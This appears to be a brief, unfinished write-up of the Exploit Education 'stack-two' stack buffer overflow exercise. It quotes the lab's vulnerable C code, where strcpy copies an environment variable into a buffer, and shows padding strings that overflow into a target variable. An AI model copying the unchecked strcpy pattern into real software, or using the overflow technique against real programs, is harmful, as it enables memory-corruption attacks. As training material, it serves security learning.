#Workin: on the problem
One major difference is the fact this code reads in user input from an environment variable.
This can be seen with the code.
```
ptr = getenv("ExploitEducation");
if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
}

locals.changeme = 0;
strcpy(locals.buffer, ptr);

if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
} else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n", locals.changeme);
}
```
With this in mind a one liner like this is needed.
```
ExploitEducation="aaaa" ./stack-two
```
Now to gain control over the variable another oneliner is required.
```
ExploitEducation=aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqq ./stack-two
```
The q's are the character that gains control over the changeme variable.
